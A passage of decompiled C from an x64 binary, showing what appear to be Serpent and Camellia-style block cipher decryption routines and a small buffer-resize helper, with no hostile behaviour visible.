  v43 = v42 ^ (v41 << 7) ^ __ROR4__(v32 ^ v35 ^ v40 ^ v10[26], 22);
  v44 = v41 ^ v42 ^ __ROR4__(v39 ^ v10[24], 5);
  v45 = 8 * v44 ^ __ROR4__(v42, 7);
  v46 = v44 ^ v43 ^ __ROR4__(v41, 1);
  v44 = __ROR4__(v44, 13);
  v47 = v43 ^ v45;
  v48 = ~v46;
  v49 = v48 ^ __ROR4__(v43, 3);
  v50 = v49 ^ (v44 | v47);
  v51 = v50 ^ v47;
  v52 = v51 ^ v44 & (v48 | v49);
  v53 = v48 & v52;
  v54 = v52 ^ v48 ^ (v44 | v51);
  v55 = v10[23] ^ v52;
  v56 = v50 ^ v53;
  v57 = v54 & v50;
  v58 = v56 ^ v54;
  v59 = v44 ^ v58 ^ v57;
  v60 = ~v58 ^ v10[21];
  v61 = v55 ^ v60 ^ __ROR4__(v56 ^ v10[20], 5);
  v62 = v55 ^ (v60 << 7) ^ __ROR4__(v59 ^ v10[22], 22);
  v63 = v62 ^ 8 * v61 ^ __ROR4__(v55, 7);
  v64 = v61 ^ v62 ^ __ROR4__(v60, 1);
  v61 = __ROR4__(v61, 13);
  v62 = __ROR4__(v62, 3);
  v65 = v64 ^ v63 & v62;
  v66 = v61 & (v63 | v64);
  v67 = ~v61;
  v68 = v66 ^ v65 ^ v62;
  v69 = v68 ^ v63;
  v70 = v69 ^ v66 & v65;
  v71 = v65 ^ v67 & v69;
  v72 = v70 ^ v67;
  v73 = v72 ^ v71;
  v74 = v73 | v68 ^ v72 & v65;
  v75 = v10[19] ^ v68;
  v76 = v72 ^ v73 ^ v10[17];
  v77 = v75 ^ (v76 << 7) ^ __ROR4__(v70 ^ v74 ^ v10[18], 22);
  v78 = v75 ^ v76 ^ __ROR4__(v72 ^ v10[16], 5);
  v79 = v78 ^ v77 ^ __ROR4__(v76, 1);
  v80 = v77 ^ 8 * v78 ^ __ROR4__(v75, 7);
  v77 = __ROR4__(v77, 3);
  v81 = v77;
  v82 = v79 ^ v77;
  v78 = __ROR4__(v78, 13);
  v83 = v78 ^ v79 & v82;
  v84 = v81 & v78;
  v85 = v80 ^ v81;
  v86 = v85 ^ v84;
  v87 = v82 ^ (v80 | v83);
  v88 = v86 ^ v82;
  v89 = v88 ^ v85;
  v90 = v87 & v88;
  v91 = v83 ^ (v87 | v86);
  v92 = v10[15] ^ v90 ^ (v87 | v83);
  v93 = v91 ^ v89 ^ v90;
  v94 = v10[13] ^ v91;
  v95 = v92 ^ (v94 << 7) ^ __ROR4__(v93 ^ v10[14], 22);
  v96 = v94 ^ v92 ^ __ROR4__(v87 ^ v10[12], 5);
  v97 = v95 ^ 8 * v96 ^ __ROR4__(v92, 7);
  v98 = v95 ^ __ROR4__(v94, 1);
  v99 = v97 ^ __ROR4__(v95, 3);
  v100 = v96 ^ v98;
  v96 = __ROR4__(v96, 13);
  v101 = v96 ^ v97;
  v102 = v100 ^ v101 & v99;
  v103 = v101 ^ (v100 | v99);
  v104 = v102 ^ v99;
  v105 = v104 ^ v96 & v102 & v101;
  v106 = ~v102;
  v107 = v106 ^ (v96 | v103 & v104);
  v108 = v105 ^ v103 & (v96 ^ v106);
  v109 = v10[9] ^ v105;
  v110 = v10[11] ^ v108 ^ v106;
  v111 = v110 ^ v109 ^ __ROR4__(v103 ^ v10[8], 5);
  v112 = v110 ^ (v109 << 7) ^ __ROR4__(v107 ^ v10[10], 22);
  v113 = 8 * v111;
  v114 = v111 ^ v112 ^ __ROR4__(v109, 1);
  v111 = __ROR4__(v111, 13);
  v115 = v112 ^ v113 ^ __ROR4__(v110, 7);
  v112 = __ROR4__(v112, 3);
  v116 = v112 ^ v114;
  v117 = v115 ^ v114;
  v118 = v111 ^ v115 & v117;
  v119 = v116 ^ (v111 | v117);
  v120 = v118 ^ v117;
  v121 = v118 ^ v112;
  v122 = v121 | v119;
  v123 = v10[7] ^ v121;
  v124 = v120 ^ v122;
  v125 = v124 ^ (v118 | v120);
  v126 = v125 ^ ~v116;
  v127 = v124 ^ (v124 | v125);
  v128 = v10[5] ^ v124;
  v129 = v128 ^ v123 ^ __ROR4__(v126 ^ v10[4], 5);
  v130 = v123 ^ (v128 << 7) ^ __ROR4__(v118 ^ (v126 | v127) ^ v10[6], 22);
  v131 = v129 ^ v130 ^ __ROR4__(v128, 1);
  v132 = v130 ^ 8 * v129 ^ __ROR4__(v123, 7);
  v133 = ~v131;
  v129 = __ROR4__(v129, 13);
  v134 = ~__ROR4__(v130, 3);
  v135 = v134 ^ v132 ^ (v129 | v131);
  v136 = v133 ^ v129;
  v137 = 3;
  v138 = v136 ^ (v134 | v133);
  v139 = v132 & v136;
  v140 = v139 ^ v133;
  v141 = v138 ^ (v139 | v135);
  v142 = v135 ^ v138;
  v143 = v135 ^ v140 ^ v132;
  v144 = v10[2] ^ v135;
  v145 = v141 ^ v143;
  v146 = *v10 ^ v141;
  v147 = v10[1] ^ v145 & v142 ^ v140;
  v148 = v10[3] ^ v145;
  do
  {
    v149 = *(v10 - 2);
    v10 -= 32;
    v150 = v147 ^ v148 ^ __ROR4__(v146, 5);
    v151 = v148 ^ (v147 << 7) ^ __ROR4__(v144, 22);
    v152 = v150 ^ v151 ^ __ROR4__(v147, 1);
    v153 = 8 * v150 ^ __ROR4__(v148, 7);
    v150 = __ROR4__(v150, 13);
    v154 = v151 ^ v153;
    v151 = __ROR4__(v151, 3);
    v155 = v151;
    v156 = v150 ^ v151;
    v157 = v154 & v150;
    v158 = v154 | v155;
    v159 = v152 ^ v154;
    v160 = v157 | v152;
    v161 = v158 & v159;
    v162 = ~v156;
    v163 = v162 ^ v157;
    v164 = v158 & v162;
    v165 = v164 ^ v160;
    v166 = v163 ^ v164;
    v167 = v165 ^ v158;
    v168 = v161 ^ (v163 | v166);
    v169 = v167 ^ v161;
    v170 = v168 | v167;
    v171 = v10[29] ^ v168;
    v172 = v10[31] ^ v166 ^ v170;
    v173 = v172 ^ (v171 << 7) ^ __ROR4__(v165 ^ v149, 22);
    v174 = v171 ^ v172 ^ __ROR4__(v166 ^ v169 ^ v10[28], 5);
    v175 = v173 ^ 8 * v174 ^ __ROR4__(v172, 7);
    v176 = v173 ^ v174 ^ __ROR4__(v171, 1);
    v173 = __ROR4__(v173, 3);
    v177 = v173 ^ __ROR4__(v174, 13);
    v178 = v175;
    v179 = v176 ^ v175;
    v180 = v177 | v173 ^ v178;
    v181 = v179 ^ ~(v173 & v177);
    v182 = v180 ^ v179;
    v183 = v181 ^ v177;
    v184 = v183 ^ v176 & v182;
    v185 = v181 | v183 ^ v182;
    v186 = v10[25] ^ v181;
    v187 = v184 ^ v182 ^ v10[27];
    v188 = v187 ^ (v186 << 7) ^ __ROR4__(v176 ^ v180 ^ v185 ^ v10[26], 22);
    v189 = v186 ^ v187 ^ __ROR4__(v184 ^ v10[24], 5);
    v190 = 8 * v189 ^ __ROR4__(v187, 7);
    v191 = v189 ^ v188 ^ __ROR4__(v186, 1);
    v189 = __ROR4__(v189, 13);
    v192 = v188 ^ v190;
    v193 = ~v191;
    v194 = v193 ^ __ROR4__(v188, 3);
    v195 = v194 ^ (v189 | v192);
    v196 = v195 ^ v192;
    v197 = v196 ^ v189 & (v193 | v194);
    v198 = v193 & v197;
    v199 = v197 ^ v193 ^ (v189 | v196);
    v200 = v10[23] ^ v197;
    v201 = v195 ^ v198;
    v202 = v199 & v195;
    v203 = v201 ^ v199;
    v204 = v189 ^ v203 ^ v202;
    v205 = ~v203 ^ v10[21];
    v206 = v200 ^ v205 ^ __ROR4__(v201 ^ v10[20], 5);
    v207 = v200 ^ (v205 << 7) ^ __ROR4__(v204 ^ v10[22], 22);
    v208 = v207 ^ 8 * v206 ^ __ROR4__(v200, 7);
    v209 = v206 ^ v207 ^ __ROR4__(v205, 1);
    v207 = __ROR4__(v207, 3);
    v206 = __ROR4__(v206, 13);
    v210 = v209 ^ v208 & v207;
    v211 = v206 & (v208 | v209);
    v212 = ~v206;
    v213 = v211 ^ v210 ^ v207;
    v214 = v213 ^ v208;
    v215 = v214 ^ v211 & v210;
    v216 = v210 ^ v212 & v214;
    v217 = v215 ^ v212;
    v218 = v217 ^ v216;
    v219 = v213 ^ v217 & v210;
    v220 = v10[19] ^ v213;
    v221 = v218 | v219;
    v222 = v217 ^ v218 ^ v10[17];
    v223 = v220 ^ v222 ^ __ROR4__(v217 ^ v10[16], 5);
    v224 = v220 ^ (v222 << 7) ^ __ROR4__(v215 ^ v221 ^ v10[18], 22);
    v225 = v224 ^ 8 * v223 ^ __ROR4__(v220, 7);
    v226 = v223 ^ v224 ^ __ROR4__(v222, 1);
    v224 = __ROR4__(v224, 3);
    v227 = v224;
    v228 = v226 ^ v224;
    v223 = __ROR4__(v223, 13);
    v229 = v223 ^ v226 & v228;
    v230 = v227 & v223;
    v231 = v225 ^ v227;
    v232 = v231 ^ v230;
    v233 = v228 ^ (v225 | v229);
    v234 = v232 ^ v228;
    v235 = v234 ^ v231;
    v236 = v233 & v234;
    v237 = v229 ^ (v233 | v232);
    v238 = v10[15] ^ v236 ^ (v233 | v229);
    v239 = v237 ^ v235 ^ v236;
    v240 = v10[13] ^ v237;
    v241 = v238 ^ (v240 << 7) ^ __ROR4__(v239 ^ v10[14], 22);
    v242 = v240 ^ v238 ^ __ROR4__(v233 ^ v10[12], 5);
    v243 = v241 ^ 8 * v242 ^ __ROR4__(v238, 7);
    v244 = v241 ^ __ROR4__(v240, 1);
    v245 = v243 ^ __ROR4__(v241, 3);
    v246 = v242 ^ v244;
    v242 = __ROR4__(v242, 13);
    v247 = v242 ^ v243;
    v248 = v246 ^ v247 & v245;
    v249 = v245;
    v250 = v248 ^ v245;
    v251 = v247 ^ (v246 | v249);
    v252 = v248 & v247;
    v253 = ~v248;
    v254 = v250 ^ v242 & v252;
    v255 = v254 ^ v251 & (v242 ^ v253);
    v256 = v10[9] ^ v254;
    v257 = v253 ^ (v242 | v251 & v250) ^ v10[10];
    v258 = v10[11] ^ v255 ^ v253;
    v259 = v258 ^ v256 ^ __ROR4__(v251 ^ v10[8], 5);
    v260 = v258 ^ (v256 << 7) ^ __ROR4__(v257, 22);
    v261 = 8 * v259;
    v262 = v259 ^ v260 ^ __ROR4__(v256, 1);
    v259 = __ROR4__(v259, 13);
    v263 = v262;
    v264 = v260 ^ v261 ^ __ROR4__(v258, 7);
    v260 = __ROR4__(v260, 3);
    v265 = v264 ^ v262;
    v266 = v260 ^ v263;
    v267 = v259 ^ v264 & v265;
    v268 = v266 ^ (v259 | v265);
    v269 = v267 ^ v265;
    v270 = v267 ^ v260;
    v271 = v270 | v268;
    v272 = v10[7] ^ v270;
    v273 = v269 ^ v271;
    v274 = v273 ^ (v267 | v269);
    v275 = v274 ^ ~v266;
    v276 = v273 ^ (v273 | v274);
    v277 = v10[5] ^ v273;
    v278 = v277 ^ v272 ^ __ROR4__(v275 ^ v10[4], 5);
    v279 = v272 ^ (v277 << 7) ^ __ROR4__(v267 ^ (v275 | v276) ^ v10[6], 22);
    v280 = v279 ^ 8 * v278 ^ __ROR4__(v272, 7);
    v281 = v278 ^ v279 ^ __ROR4__(v277, 1);
    v278 = __ROR4__(v278, 13);
    v282 = ~v281;
    v283 = v280 ^ (v278 | v281);
    v284 = ~__ROR4__(v279, 3);
    v285 = v282 ^ v278;
    v286 = v284 ^ v283;
    v287 = v285 ^ (v284 | v282);
    v288 = v280 & v285;
    v289 = v288 ^ v282;
    v290 = v287 ^ (v288 | v286);
    v291 = v286 ^ v287;
    v292 = v286 ^ v289 ^ v280;
    v144 = v10[2] ^ v286;
    v293 = v290 ^ v292;
    v146 = *v10 ^ v290;
    v294 = v293 & v291;
    v148 = v10[3] ^ v293;
    v147 = v10[1] ^ v294 ^ v289;
    --v137;
  }
  while ( v137 );
  v295 = 0;
  if ( a3 )
    v296 = *a3;
  else
    v296 = 0;
  *v5 = v146 ^ v296;
  if ( a3 && ++a3 != 0i64 )
    v297 = *a3;
  else
    v297 = 0;
  v5[1] = v147 ^ v297;
  if ( a3 && ++a3 != 0i64 )
    v298 = *a3;
  else
    v298 = 0;
  v5[2] = v144 ^ v298;
  if ( a3 )
  {
    v299 = (unsigned int *)(a3 + 1);
    if ( v299 )
      v295 = *v299;
  }
  result = v148 ^ v295;
  v5[3] = result;
  return result;
}

//----- (000000014008F160) ----------------------------------------------------
__int64 __fastcall sub_14008F160(__int64 a1, __int64 a2, unsigned int a3)
{
  return sub_14008EC20(*(_QWORD *)(a1 + 568), 32i64, a2, a3);
}
// 14008EC20: using guessed type __int64 __fastcall sub_14008EC20(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014008F180) ----------------------------------------------------
void __fastcall sub_14008F180(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  _DWORD *v3; // rdx
  __int64 v4; // rbx
  __int64 v5; // rcx
  _DWORD *v6; // rdi
  void *v7; // rax

  v2 = a2;
  v3 = *(_DWORD **)(a1 + 16);
  v4 = a1;
  v5 = *(_QWORD *)(a1 + 8);
  if ( v5 == v2 )
  {
    *(_QWORD *)(v4 + 16) = v3;
    *(_QWORD *)(v4 + 8) = v2;
  }
  else
  {
    v6 = v3;
    while ( v5 )
    {
      *v6 = 0;
      ++v6;
      --v5;
    }
    free(v3);
    sub_14004F230(v2);
    if ( v2 )
    {
      v7 = sub_14003A000(4 * v2);
      *(_QWORD *)(v4 + 8) = v2;
      *(_QWORD *)(v4 + 16) = v7;
    }
    else
    {
      *(_QWORD *)(v4 + 8) = 0i64;
      *(_QWORD *)(v4 + 16) = 0i64;
    }
  }
}

//----- (000000014008F210) ----------------------------------------------------
__int64 __fastcall sub_14008F210(__int64 a1, unsigned int *a2, unsigned int *a3, unsigned __int32 *a4)
{
  __int64 v4; // r15
  unsigned __int32 v5; // ebp
  unsigned int *v6; // rbx
  unsigned __int32 *v7; // rdi
  __int64 v8; // r10
  unsigned __int32 v9; // esi
  unsigned __int32 v10; // er12
  unsigned __int32 v11; // er14
  int v12; // er13
  int v13; // edx
  unsigned int v14; // ecx
  __int64 v15; // rax
  unsigned int v16; // edx
  int v17; // esi
  int v18; // ebp
  int v19; // er9
  int v20; // edx
  int v21; // er9
  int v22; // edx
  int v23; // er12
  int v24; // er14
  int v25; // er9
  int v26; // edx
  int v27; // er9
  int v28; // edx
  int v29; // esi
  int v30; // ebp
  int v31; // ebx
  int v32; // er9
  int v33; // er8
  int v34; // er12
  int v35; // er14
  int v36; // er9
  int v37; // er8
  int v38; // esi
  int v39; // ebp
  int v40; // er9
  int v41; // er8
  int v42; // er12
  int v43; // er14
  int v44; // er10
  int v45; // er8
  int v46; // esi
  int v47; // ebp
  int v48; // esi
  int v49; // er12
  int v50; // er11
  int v51; // er9
  int v52; // er8
  int v53; // er9
  int v54; // er10
  int v55; // er8
  int v56; // er9
  int v57; // er8
  int v58; // er9
  int v59; // er8
  int v60; // er12
  int v61; // er14
  int v62; // er9
  int v63; // er8
  int v64; // esi
  int v65; // ebp
  int v66; // er9
  int v67; // er8
  int v68; // er12
  int v69; // er14
  int v70; // er9
  int v71; // er14
  int v72; // edx
  int v73; // er9
  int v74; // edx
  int v75; // esi
  int v76; // ebp
  int v77; // ecx
  int v78; // eax
  __int64 result; // rax
  int *v80; // rbx
  __int64 v81; // [rsp+60h] [rbp+8h]
  unsigned int *v82; // [rsp+68h] [rbp+10h]
  unsigned __int32 *v83; // [rsp+78h] [rbp+20h]

  v83 = a4;
  v81 = a1;
  v4 = *(_QWORD *)(a1 + 40);
  v5 = *(_DWORD *)(v4 + 8) ^ _byteswap_ulong(a2[1]);
  v6 = a3;
  v7 = a4;
  v8 = a1;
  v82 = a3;
  v9 = *(_DWORD *)(v4 + 12) ^ _byteswap_ulong(*a2);
  v10 = *(_DWORD *)(v4 + 4) ^ _byteswap_ulong(a2[2]);
  v11 = *(_DWORD *)v4 ^ _byteswap_ulong(a2[3]);
  if ( !byte_1400DBD4C )
  {
    sub_14006AA50();
    v8 = v81;
  }
  v12 = 0;
  v13 = 0;
  v14 = 0;
  do
  {
    v15 = v14;
    v14 += dword_1400D80C0;
    v13 &= *(_DWORD *)(v15 + 5369444480i64);
  }
  while ( v14 < 0x100 );
  v16 = v13 & 0x9E80C777;
  v17 = v16 | v9;
  v18 = v16 | v5;
  v19 = (unsigned __int8)__ROL1__(byte_1400B3880[((unsigned int)v18 ^ *(_DWORD *)(v4 + 24)) >> 24], 1) | ((byte_1400B3880[(unsigned __int8)(v18 ^ *(_BYTE *)(v4 + 24))] | ((byte_1400B3880[(unsigned __int8)__ROL1__((unsigned __int16)(v18 ^ *(_WORD *)(v4 + 24)) >> 8, 1)] | ((unsigned __int8)__ROR1__(byte_1400B3880[(unsigned __int8)(((unsigned int)v18 ^ *(_DWORD *)(v4 + 24)) >> 16)], 1) << 8)) << 8)) << 8);
  v20 = v19 ^ (byte_1400B3880[(unsigned __int8)__ROL1__(v17 ^ *(_BYTE *)(v4 + 28), 1)] | (((unsigned __int8)__ROR1__(byte_1400B3880[(unsigned __int16)(v17 ^ *(_WORD *)(v4 + 28)) >> 8], 1) | (((byte_1400B3880[((unsigned int)v17 ^ *(_DWORD *)(v4 + 28)) >> 24] << 8) | (unsigned __int8)__ROL1__(byte_1400B3880[(unsigned __int8)(((unsigned int)v17 ^ *(_DWORD *)(v4 + 28)) >> 16)], 1)) << 8)) << 8));
  v21 = v20 ^ __ROL4__(v19, 8);
  v22 = v21 ^ __ROR4__(v20, 8);
  v23 = v22 ^ __ROL4__(v21, 16) ^ v10;
  v24 = __ROL4__(v22, 8) ^ v11;
  v25 = (unsigned __int8)__ROL1__(byte_1400B3880[((unsigned int)v24 ^ *(_DWORD *)(v4 + 16)) >> 24], 1) | ((byte_1400B3880[(unsigned __int8)(v24 ^ *(_BYTE *)(v4 + 16))] | ((byte_1400B3880[(unsigned __int8)__ROL1__((unsigned __int16)(v24 ^ *(_WORD *)(v4 + 16)) >> 8, 1)] | ((unsigned __int8)__ROR1__(byte_1400B3880[(unsigned __int8)(((unsigned int)v24 ^ *(_DWORD *)(v4 + 16)) >> 16)], 1) << 8)) << 8)) << 8);
  v26 = v25 ^ (byte_1400B3880[(unsigned __int8)__ROL1__(v23 ^ *(_BYTE *)(v4 + 20), 1)] | (((unsigned __int8)__ROR1__(byte_1400B3880[(unsigned __int16)(v23 ^ *(_WORD *)(v4 + 20)) >> 8], 1) | (((byte_1400B3880[((unsigned int)v23 ^ *(_DWORD *)(v4 + 20)) >> 24] << 8) | (unsigned __int8)__ROL1__(byte_1400B3880[(unsigned __int8)(((unsigned int)v23 ^ *(_DWORD *)(v4 + 20)) >> 16)], 1)) << 8)) << 8));
  v27 = v26 ^ __ROL4__(v25, 8);
  v28 = v27 ^ __ROR4__(v26, 8);
  v29 = v28 ^ __ROL4__(v27, 16) ^ v17;
  v30 = __ROL4__(v28, 8) ^ v18;
  if ( *(_DWORD *)(v8 + 16) != 1 )
  {
    v31 = *(_DWORD *)(v8 + 16) - 1;
    do
    {
      v32 = dword_1400B4580[(unsigned __int8)(v29 ^ *(_BYTE *)(v4 + 44))] ^ dword_1400B4180[(unsigned __int16)(v29 ^ *(_WORD *)(v4 + 44)) >> 8] ^ dword_1400B3D80[(unsigned __int8)(((unsigned int)v29 ^ *(_DWORD *)(v4 + 44)) >> 16)] ^ dword_1400B3980[((unsigned int)v29 ^ *(_DWORD *)(v4 + 44)) >> 24];
      v33 = v32 ^ dword_1400B3980[(unsigned __int8)(v30 ^ *(_BYTE *)(v4 + 40))] ^ dword_1400B4580[(unsigned __int16)(v30 ^ *(_WORD *)(v4 + 40)) >> 8] ^ dword_1400B4180[(unsigned __int8)(((unsigned int)v30 ^ *(_DWORD *)(v4 + 40)) >> 16)] ^ dword_1400B3D80[((unsigned int)v30 ^ *(_DWORD *)(v4 + 40)) >> 24];
      v34 = v33 ^ v23;
      v35 = v33 ^ __ROR4__(v32, 8) ^ v24;
      v36 = dword_1400B4580[(unsigned __int8)(v34 ^ *(_BYTE *)(v4 + 36))] ^ dword_1400B4180[(unsigned __int16)(v34 ^ *(_WORD *)(v4 + 36)) >> 8] ^ dword_1400B3D80[(unsigned __int8)(((unsigned int)v34 ^ *(_DWORD *)(v4 + 36)) >> 16)] ^ dword_1400B3980[((unsigned int)v34 ^ *(_DWORD *)(v4 + 36)) >> 24];
      v37 = v36 ^ dword_1400B3980[(unsigned __int8)(v35 ^ *(_BYTE *)(v4 + 32))] ^ dword_1400B4580[(unsigned __int16)(v35 ^ *(_WORD *)(v4 + 32)) >> 8] ^ dword_1400B4180[(unsigned __int8)(((unsigned int)v35 ^ *(_DWORD *)(v4 + 32)) >> 16)] ^ dword_1400B3D80[((unsigned int)v35 ^ *(_DWORD *)(v4 + 32)) >> 24];
      v38 = v37 ^ v29;
      v39 = v37 ^ __ROR4__(v36, 8) ^ v30;
      v40 = dword_1400B4580[(unsigned __int8)(v38 ^ *(_BYTE *)(v4 + 60))] ^ dword_1400B4180[(unsigned __int16)(v38 ^ *(_WORD *)(v4 + 60)) >> 8] ^ dword_1400B3D80[(unsigned __int8)(((unsigned int)v38 ^ *(_DWORD *)(v4 + 60)) >> 16)] ^ dword_1400B3980[((unsigned int)v38 ^ *(_DWORD *)(v4 + 60)) >> 24];
      v41 = v40 ^ dword_1400B3980[(unsigned __int8)(v39 ^ *(_BYTE *)(v4 + 56))] ^ dword_1400B4580[(unsigned __int16)(v39 ^ *(_WORD *)(v4 + 56)) >> 8] ^ dword_1400B4180[(unsigned __int8)(((unsigned int)v39 ^ *(_DWORD *)(v4 + 56)) >> 16)] ^ dword_1400B3D80[((unsigned int)v39 ^ *(_DWORD *)(v4 + 56)) >> 24];
      v42 = v41 ^ v34;
      v43 = v41 ^ __ROR4__(v40, 8) ^ v35;
      v44 = dword_1400B4580[(unsigned __int8)(v42 ^ *(_BYTE *)(v4 + 52))] ^ dword_1400B4180[(unsigned __int16)(v42 ^ *(_WORD *)(v4 + 52)) >> 8] ^ dword_1400B3D80[(unsigned __int8)(((unsigned int)v42 ^ *(_DWORD *)(v4 + 52)) >> 16)] ^ dword_1400B3980[((unsigned int)v42 ^ *(_DWORD *)(v4 + 52)) >> 24];
      v45 = v44 ^ dword_1400B3980[(unsigned __int8)(v43 ^ *(_BYTE *)(v4 + 48))] ^ dword_1400B4580[(unsigned __int16)(v43 ^ *(_WORD *)(v4 + 48)) >> 8] ^ dword_1400B4180[(unsigned __int8)(((unsigned int)v43 ^ *(_DWORD *)(v4 + 48)) >> 16)] ^ dword_1400B3D80[((unsigned int)v43 ^ *(_DWORD *)(v4 + 48)) >> 24];
      v46 = v45 ^ v38;
      v47 = v45 ^ __ROR4__(v44, 8) ^ __ROL4__(v46 & *(_DWORD *)(v4 + 76), 1) ^ v39;
      v48 = (v47 | *(_DWORD *)(v4 + 72)) ^ v46;
      v49 = (*(_DWORD *)(v4 + 64) | v43) ^ v42;
      v50 = __ROL4__(v49 & *(_DWORD *)(v4 + 68), 1);
      v51 = *(_DWORD *)(v4 + 88);
      v52 = v48 ^ *(_DWORD *)(v4 + 92);
      v4 += 64i64;
      v53 = v47 ^ v51;
      v54 = dword_1400B4580[(unsigned __int8)v52] ^ dword_1400B4180[BYTE1(v52)] ^ dword_1400B3D80[BYTE2(v52)] ^ dword_1400B3980[HIBYTE(v52)];
      v55 = v54 ^ dword_1400B3980[(unsigned __int8)v53] ^ dword_1400B4580[BYTE1(v53)] ^ dword_1400B4180[BYTE2(v53)] ^ dword_1400B3D80[HIBYTE(v53)];
      v23 = v55 ^ v49;
      v24 = v50 ^ v55 ^ __ROR4__(v54, 8) ^ v43;
      v56 = dword_1400B4580[(unsigned __int8)(v23 ^ *(_BYTE *)(v4 + 20))] ^ dword_1400B4180[(unsigned __int16)(v23 ^ *(_WORD *)(v4 + 20)) >> 8] ^ dword_1400B3D80[(unsigned __int8)(((unsigned int)v23 ^ *(_DWORD *)(v4 + 20)) >> 16)] ^ dword_1400B3980[((unsigned int)v23 ^ *(_DWORD *)(v4 + 20)) >> 24];
      v57 = v56 ^ dword_1400B3980[(unsigned __int8)(v24 ^ *(_BYTE *)(v4 + 16))] ^ dword_1400B4580[(unsigned __int16)(v24 ^ *(_WORD *)(v4 + 16)) >> 8] ^ dword_1400B4180[(unsigned __int8)(((unsigned int)v24 ^ *(_DWORD *)(v4 + 16)) >> 16)] ^ dword_1400B3D80[((unsigned int)v24 ^ *(_DWORD *)(v4 + 16)) >> 24];
      v29 = v57 ^ v48;
      v30 = v57 ^ __ROR4__(v56, 8) ^ v47;
      --v31;
    }
    while ( v31 );
    v6 = v82;
    v7 = v83;
  }
  v58 = dword_1400B4580[(unsigned __int8)(v29 ^ *(_BYTE *)(v4 + 44))] ^ dword_1400B4180[(unsigned __int16)(v29 ^ *(_WORD *)(v4 + 44)) >> 8] ^ dword_1400B3D80[(unsigned __int8)(((unsigned int)v29 ^ *(_DWORD *)(v4 + 44)) >> 16)] ^ dword_1400B3980[((unsigned int)v29 ^ *(_DWORD *)(v4 + 44)) >> 24];
  v59 = v58 ^ dword_1400B3980[(unsigned __int8)(v30 ^ *(_BYTE *)(v4 + 40))] ^ dword_1400B4580[(unsigned __int16)(v30 ^ *(_WORD *)(v4 + 40)) >> 8] ^ dword_1400B4180[(unsigned __int8)(((unsigned int)v30 ^ *(_DWORD *)(v4 + 40)) >> 16)] ^ dword_1400B3D80[((unsigned int)v30 ^ *(_DWORD *)(v4 + 40)) >> 24];
  v60 = v59 ^ v23;
  v61 = v59 ^ __ROR4__(v58, 8) ^ v24;
  v62 = dword_1400B4580[(unsigned __int8)(v60 ^ *(_BYTE *)(v4 + 36))] ^ dword_1400B4180[(unsigned __int16)(v60 ^ *(_WORD *)(v4 + 36)) >> 8] ^ dword_1400B3D80[(unsigned __int8)(((unsigned int)v60 ^ *(_DWORD *)(v4 + 36)) >> 16)] ^ dword_1400B3980[((unsigned int)v60 ^ *(_DWORD *)(v4 + 36)) >> 24];
  v63 = v62 ^ dword_1400B3980[(unsigned __int8)(v61 ^ *(_BYTE *)(v4 + 32))] ^ dword_1400B4580[(unsigned __int16)(v61 ^ *(_WORD *)(v4 + 32)) >> 8] ^ dword_1400B4180[(unsigned __int8)(((unsigned int)v61 ^ *(_DWORD *)(v4 + 32)) >> 16)] ^ dword_1400B3D80[((unsigned int)v61 ^ *(_DWORD *)(v4 + 32)) >> 24];
  v64 = v63 ^ v29;
  v65 = v63 ^ __ROR4__(v62, 8) ^ v30;
  v66 = dword_1400B4580[(unsigned __int8)(v64 ^ *(_BYTE *)(v4 + 60))] ^ dword_1400B4180[(unsigned __int16)(v64 ^ *(_WORD *)(v4 + 60)) >> 8] ^ dword_1400B3D80[(unsigned __int8)(((unsigned int)v64 ^ *(_DWORD *)(v4 + 60)) >> 16)] ^ dword_1400B3980[((unsigned int)v64 ^ *(_DWORD *)(v4 + 60)) >> 24];
  v67 = v66 ^ dword_1400B3980[(unsigned __int8)(v65 ^ *(_BYTE *)(v4 + 56))] ^ dword_1400B4580[(unsigned __int16)(v65 ^ *(_WORD *)(v4 + 56)) >> 8] ^ dword_1400B4180[(unsigned __int8)(((unsigned int)v65 ^ *(_DWORD *)(v4 + 56)) >> 16)] ^ dword_1400B3D80[((unsigned int)v65 ^ *(_DWORD *)(v4 + 56)) >> 24];
  v68 = v67 ^ v60;
  v69 = v67 ^ __ROR4__(v66, 8) ^ v61;
  v70 = (unsigned __int8)__ROL1__(byte_1400B3880[((unsigned int)v69 ^ *(_DWORD *)(v4 + 48)) >> 24], 1) | ((byte_1400B3880[(unsigned __int8)(v69 ^ *(_BYTE *)(v4 + 48))] | ((byte_1400B3880[(unsigned __int8)__ROL1__((unsigned __int16)(v69 ^ *(_WORD *)(v4 + 48)) >> 8, 1)] | ((unsigned __int8)__ROR1__(byte_1400B3880[(unsigned __int8)(((unsigned int)v69 ^ *(_DWORD *)(v4 + 48)) >> 16)], 1) << 8)) << 8)) << 8);
  v71 = *(_DWORD *)(v4 + 64) ^ v69;
  v72 = v70 ^ (byte_1400B3880[(unsigned __int8)__ROL1__(v68 ^ *(_BYTE *)(v4 + 52), 1)] | (((unsigned __int8)__ROR1__(byte_1400B3880[(unsigned __int16)(v68 ^ *(_WORD *)(v4 + 52)) >> 8], 1) | (((byte_1400B3880[((unsigned int)v68 ^ *(_DWORD *)(v4 + 52)) >> 24] << 8) | (unsigned __int8)__ROL1__(byte_1400B3880[(unsigned __int8)(((unsigned int)v68 ^ *(_DWORD *)(v4 + 52)) >> 16)], 1)) << 8)) << 8));
  v73 = v72 ^ __ROL4__(v70, 8);
  v74 = v73 ^ __ROR4__(v72, 8);
  v75 = v74 ^ *(_DWORD *)(v4 + 76) ^ __ROL4__(v73, 16) ^ v64;
  v76 = *(_DWORD *)(v4 + 72) ^ __ROL4__(v74, 8) ^ v65;
  if ( v6 )
    v77 = *v6;
  else
    v77 = 0;
  *v7 = v77 ^ _byteswap_ulong(v68 ^ *(_DWORD *)(v4 + 68));
  if ( v6 && ++v6 != 0i64 )
    v78 = *v6;
  else
    v78 = 0;
  v7[1] = v78 ^ _byteswap_ulong(v71);
  if ( v6 && ++v6 != 0i64 )
    result = *v6;
  else
    result = 0i64;
  v7[2] = result ^ _byteswap_ulong(v75);
  if ( v6 )
  {
    v80 = (int *)(v6 + 1);
    if ( v80 )
      v12 = *v80;
  }
  v7[3] = v12 ^ _byteswap_ulong(v76);
  return result;
}
// 1400D80C0: using guessed type int dword_1400D80C0;
// 1400DBD4C: using guessed type char byte_1400DBD4C;

//----- (000000014008FC00) ----------------------------------------------------
unsigned __int64 __fastcall sub_14008FC00(__int64 a1, unsigned int *a2, unsigned int a3)
{
  unsigned int *v3; // rdi
  __int64 v4; // rbx
